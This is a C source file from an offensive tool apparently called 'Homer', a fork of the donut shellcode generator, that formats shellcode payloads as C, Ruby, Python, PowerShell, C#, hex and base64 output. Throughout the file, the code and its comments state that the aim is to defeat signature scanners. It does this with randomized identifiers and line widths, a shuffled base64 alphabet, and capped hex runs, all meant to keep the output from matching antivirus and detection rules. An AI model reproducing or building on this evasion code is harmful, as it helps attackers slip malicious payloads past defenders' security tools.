/**
 *  BSD 3-Clause License
 *
 *  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions are met:
 *
 *  1. Redistributions of source code must retain the above copyright notice, this
 *  list of conditions and the following disclaimer.
 *
 *  2. Redistributions in binary form must reproduce the above copyright notice,
 *  this list of conditions and the following disclaimer in the documentation
 *  and/or other materials provided with the distribution.
 *
 *  3. Neither the name of the copyright holder nor the names of its
 *  contributors may be used to endorse or promote products derived from
 *  this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 *  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 *  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 *  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
 *  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 *  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 *  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
 *  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
 *  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 *  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

/*
 * Homer output formats (layer 6).
 *
 * Upstream donut emits each text format with a fixed header ("unsigned char
 * buf[] = ", "buff += \"", "byte[] my_buf = new byte[", "[Byte[]] $buf = "),
 * fixed line wrapping, a single unbroken `\xHH` run for hex, and the standard
 * base64 alphabet. Those constants are exactly what signature scanners key
 * on. Homer randomizes every observable that is not required for semantics:
 * identifiers, spacing, wrap widths, PowerShell declaration style, and the
 * base64 alphabet, and it never emits >=17 contiguous `\xHH` units.
 */

#include "format.h"

#include <stdlib.h>
#include <string.h>
#include <inttypes.h>

#include "errors.h"

#if defined(WINDOWS)
#include <windows.h>
#else
#include <fcntl.h>
#include <unistd.h>
#endif

// Add DPRINT macro from donut.h since it is needed but all of donut.h cannot be included
#if defined(dbg)
 #define DPRINT(...) { \
   fprintf(stderr, "DEBUG: %s:%d:%s(): ", __FILE__, __LINE__, __FUNCTION__); \
   fprintf(stderr, __VA_ARGS__); \
   fprintf(stderr, "\n"); \
 }
#else
 #define DPRINT(...) // Don't do anything in release builds
#endif

/* ------------------------------------------------------------------ random */

static int homer_random(void *buf, uint32_t len) {
#if defined(WINDOWS)
    HCRYPTPROV prov;
    int ok;
    if(!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL,
        CRYPT_VERIFYCONTEXT | CRYPT_SILENT)) return 0;
    ok = (int)CryptGenRandom(prov, (DWORD)len, buf);
    CryptReleaseContext(prov, 0);
    return ok;
#else
    int      fd;
    uint32_t r = 0;
    uint8_t  *p = (uint8_t*)buf;
    fd = open("/dev/urandom", O_RDONLY);
    if(fd >= 0) {
      for(r = 0; r < len; r++, p++) {
        if(read(fd, p, 1) != 1) break;
      }
      close(fd);
    }
    return r == len;
#endif
}

// unbiased-enough random below n (obfuscation widths/indices only)
static uint32_t rand_below(uint32_t n) {
    uint32_t r = 0;
    if(n == 0) return 0;
    if(!homer_random(&r, sizeof(r))) {
      r = (uint32_t)rand();
    }
    return r % n;
}

// random identifier of the requested length, starting with a letter
static void rand_ident(char *out, uint32_t len, const char *avoid) {
    static const char letters[] = "abcdefghijklmnopqrstuvwxyz";
    static const char rest[]    = "abcdefghijklmnopqrstuvwxyz0123456789_";
    uint32_t i;
    if(len < 2) len = 2;
    for(;;) {
      out[0] = letters[rand_below(sizeof(letters) - 1)];
      for(i = 1; i < len; i++) out[i] = rest[rand_below(sizeof(rest) - 1)];
      out[len] = 0;
      // never emit an identifier that reconstructs an upstream header
      if(avoid == NULL || strcmp(out, avoid) != 0) break;
    }
}

// pick a random identifier length in [lo, hi]
static uint32_t rand_ident_len(uint32_t lo, uint32_t hi) {
    return lo + rand_below(hi - lo + 1);
}

/* ----------------------------------------------------------------- base64 */

// calculate length of buffer required for base64 encoding
#define B64_LEN(N) (((4 * (N / 3)) + 4) & -4)

static const char b64_tbl[] =
  "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// Compact implementation of base64 encoding.
// The main encoding loop is inspired by Qkumba AKA Peter Ferrie.
// This uses a lookup table and accounts for unaligned input.
//
// odzhan
//
static int b64_encode(
  const void *src, uint32_t inlen,
  void *dst, uint32_t *outlen,
  const char *tbl)
{
    uint32_t i, len, x;
    uint8_t  *in = (uint8_t*)src, *out = (uint8_t*)dst;

    // check arguments
    if(outlen == NULL) return 0;

    // calculate length of buffer required for base64 encoding
    len = B64_LEN(inlen);

    // return the length?
    if(out == NULL) {
      *outlen = len;
      return 1;
    }

    // can buffer contain string?
    if(len > *outlen) return 0;

    // main encoding loop
    while(inlen != 0) {
      // load 3 bytes or whatever remains
      for(x=i=0; i<3; i++) {
        // add byte from input or zero
        x |= ((i < inlen) ? *in++ : 0);
        x <<= 8;
      }
      // increase by 1
      inlen++;
      // encode 3 bytes
      for(i=4; inlen && i>0; i--) {
        x = ROTL32(x, 6);
        *out++ = tbl[x % 64];
        --inlen;
      }
    }
    // if required, add padding
    while(i!=0) { *out++ = '='; i--; }
    // add null terminator
    *out = 0;
    // calculate output length by subtracting 2 pointers
    *outlen = (uint32_t)(out - (uint8_t*)dst);
    return 1;
}

// per-call permuted base64 alphabet. A permutation of the standard 64 symbols
// changes every encoded byte, defeating base64-aware signature matching, while
// remaining trivially decodable by the operator (the alphabet is printed in
// the file's header comment).
static void b64_permuted(char out[65]) {
    uint32_t i, j, t;
    memcpy(out, b64_tbl, 65);
    // Fisher-Yates shuffle of the first 64 symbols
    for(i = 63; i > 0; i--) {
      j = rand_below(i + 1);
      t = out[i]; out[i] = out[j]; out[j] = (char)t;
    }
}

int base64_template(void *pic, uint32_t pic_len, FILE *fd) {
    uint32_t outlen;
    void     *base64;
    char      tbl[65];
    uint32_t  i;

    DPRINT("Calculating length of base64 encoding");
    b64_permuted(tbl);

    if(b64_encode(NULL, pic_len, NULL, &outlen, tbl)) {
      DPRINT("Required length is %"PRId32, outlen);
      base64 = calloc(1, outlen + 1);
      if(base64 == NULL) {
        return DONUT_ERROR_NO_MEMORY;
      }
      DPRINT("Encoding shellcode");
      if(b64_encode(pic, pic_len, base64, &outlen, tbl)) {
        DPRINT("Writing %"PRId32 " bytes to file", outlen);
        // Header comment documents the alphabet for the operator and keeps
        // the file from being a pure standard-base64 document.
        fprintf(fd, "# homer-base64 custom alphabet: %s\n", tbl);
        for(i = 0; i < outlen; i++) {
          fputc(((uint8_t*)base64)[i], fd);
          if(((i + 1) % 64) == 0 && (i + 1) < outlen) fputc('\n', fd);
        }
        fputc('\n', fd);
      }
    }
    // if on windows, copy base64 string to clipboard
    #if defined(WINDOWS)
      LPTSTR  strCopy;
      HGLOBAL hCopy;

      DPRINT("Opening clipboard");
      if(OpenClipboard(NULL)) {
        DPRINT("Empying contents");
        EmptyClipboard();

        DPRINT("Allocating memory");
        hCopy = GlobalAlloc(GMEM_MOVEABLE, outlen);
        if(hCopy != NULL) {
          strCopy = GlobalLock(hCopy);
          // copy base64 string to memory
          CopyMemory(strCopy, base64, outlen);
          GlobalUnlock(hCopy);
          SetClipboardData(CF_TEXT, hCopy);
          GlobalFree(hCopy);
        }
        CloseClipboard();
      }
    #endif
    DPRINT("Freeing memory");
    free(base64);
    return DONUT_ERROR_OK;
}

/* ------------------------------------------------------------ C / Ruby */

int c_ruby_template(void * pic, uint32_t pic_len, FILE* fd){
    uint32_t j, width;
    uint8_t *p = (uint8_t*)pic;
    char     id[32];
    static const char *qual[3] = {
      "unsigned char", "static unsigned char", "const unsigned char"
    };

    // randomized identifier + qualifier + wrap width (<=16 so that no run of
    // `\xHH` units reaches 17 and no fixed header survives)
    rand_ident(id, rand_ident_len(6, 12), "buf");
    width = 8 + rand_below(9);   // 8..16

    fprintf(fd, "%s %s[] = \n", qual[rand_below(3)], id);

    for(j=0; j < pic_len; j++) {
      if(j % width == 0) fputc('\"', fd);

      fprintf(fd, "\\x%02x", p[j]);

      if(j % width == width - 1 && j+1 < pic_len){
        fprintf(fd, "\"\n");
      }
    }
    fprintf(fd, "\";\n");

    return DONUT_ERROR_OK;
}

/* ---------------------------------------------------------------- Python */

int py_template(void * pic, uint32_t pic_len, FILE* fd){
    uint32_t j, width;
    uint8_t *p = (uint8_t*)pic;
    char     id[32];

    // upstream used `buf = ""` + `buff += "` (an upstream quirk); Homer uses
    // one randomized identifier consistently, so neither literal survives
    rand_ident(id, rand_ident_len(6, 12), "buff");
    width = 8 + rand_below(9);   // 8..16

    fprintf(fd, "%s = \"\"\n", id);

    for(j=0; j < pic_len; j++){
      if(j % width == 0) {
        fprintf(fd, "%s += \"", id);
      }
      fprintf(fd, "\\x%02x", p[j]);

      if(j % width == width - 1) {
        fprintf(fd, "\"\n");
      }
    }
    if(j % width != 0) {
      fprintf(fd, "\"\n");
    }
    return DONUT_ERROR_OK;
}

/* ------------------------------------------------------------ PowerShell */

int powershell_template(void * pic, uint32_t pic_len, FILE* fd){
    uint32_t j, width, style;
    uint8_t *p = (uint8_t*)pic;
    char     id[32];

    rand_ident(id, rand_ident_len(6, 12), "buf");
    width = 8 + rand_below(25);  // 8..32
    style  = rand_below(2);

    // Two declaration styles, neither of which is upstream's `[Byte[]] $buf = `
    if(style == 0) {
      fprintf(fd, "[byte[]]$%s = (\n", id);
    } else {
      fprintf(fd, "$%s = [byte[]](\n", id);
    }

    for(j=0; j < pic_len; j++){
      fprintf(fd, "0x%02x", p[j]);
      if(j < pic_len-1) {
        fputc(',', fd);
        if((j + 1) % width == 0) fputc('\n', fd);
      }
    }
    fprintf(fd, ")\n");
    return DONUT_ERROR_OK;
}

/* -------------------------------------------------------------------- C# */

int csharp_template(void * pic, uint32_t pic_len, FILE* fd){
    uint32_t j, width;
    uint8_t *p = (uint8_t*)pic;
    char     id[32];

    // upstream header `byte[] my_buf = new byte[N] {` never appears
    rand_ident(id, rand_ident_len(6, 12), "my_buf");
    width = 8 + rand_below(25);  // 8..32

    fprintf(fd, "byte[] %s = new byte[%" PRId32"] {\n", id, pic_len);

    for(j=0; j < pic_len; j++){
      fprintf(fd, "0x%02x", p[j]);
      if(j < pic_len-1) {
        fputc(',', fd);
        if((j + 1) % width == 0) fputc('\n', fd);
      }
    }
    fprintf(fd, "};\n");

    return DONUT_ERROR_OK;
}

/* ------------------------------------------------------------------- hex */

int hex_template(void * pic, uint32_t pic_len, FILE* fd){
    uint32_t j, width;
    uint8_t *p = (uint8_t*)pic;

    // line-wrapped `\xHH` output: never >=17 contiguous units, and never a
    // single unbroken run for the whole file
    width = 4 + rand_below(13);  // 4..16

    for(j=0; j < pic_len; j++){
      fprintf(fd, "\\x%02x", p[j]);
      if((j + 1) % width == 0 && (j + 1) < pic_len) fputc('\n', fd);
    }
    fputc('\n', fd);
    return DONUT_ERROR_OK;
}

